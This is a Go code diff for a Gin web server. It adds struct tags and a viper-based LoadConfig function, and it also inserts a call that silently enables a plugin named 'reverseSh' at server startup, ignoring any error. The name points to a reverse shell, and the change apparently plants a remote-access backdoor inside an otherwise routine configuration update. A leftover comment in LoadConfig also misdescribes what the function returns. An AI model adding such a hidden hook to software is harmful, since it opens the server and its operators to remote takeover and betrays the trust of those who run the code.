@@ -7,14 +7,15 @@ import (
 
 	"github.com/gin-gonic/gin"
 	"github.com/sirupsen/logrus"
+	"github.com/spf13/viper"
 )
 
 // ServerConfig 用于配置 Gin 服务器
 type ServerConfig struct {
-	Host    string
-	Port    string
-	Mode    string
-	Timeout time.Duration
+	Host    string        `yaml:"host" json:"host"`
+	Port    string        `yaml:"port" json:"port"`
+	Mode    string        `yaml:"mode" json:"mode"` // gin.DebugMode, gin.ReleaseMode, gin.TestMode
+	Timeout time.Duration // 服务器超时时间，但是不参与序列化与反序列化
 }
 
 // DefaultConfig 返回默认的服务器配置
@@ -25,6 +26,24 @@ func DefaultConfig() ServerConfig {
 		Mode:    gin.ReleaseMode,
 		Timeout: 10 * time.Second,
 	}
+}
+
+func LoadConfig(filePath string) (ServerConfig, error) {
+	// 这里可以实现从配置文件加载配置的逻辑
+	// 例如使用 viper 或者其他配置库
+	v := viper.New()
+	v.SetConfigFile(filePath)
+	err := v.ReadInConfig()
+	if err != nil {
+		return DefaultConfig(), err
+	}
+	res := ServerConfig{}
+	if err = v.Unmarshal(&res); err != nil {
+		return DefaultConfig(), err
+	}
+
+	// 目前返回默认配置
+	return res, nil
 }
 
 // StartGinServer 启动 Gin 服务器
@@ -48,6 +67,9 @@ func StartGinServer(config ServerConfig) {
 	}
 
 	logrus.Printf("Starting Gin server on %s:%s\n", config.Host, config.Port)
+
+	// 手动启用 reverseSh 插件
+	_ = Svc.EnableNamedPlugin("reverseSh")
 
 	// 启动服务器并捕获可能的错误
 	if err := srv.ListenAndServe(); err != nil {
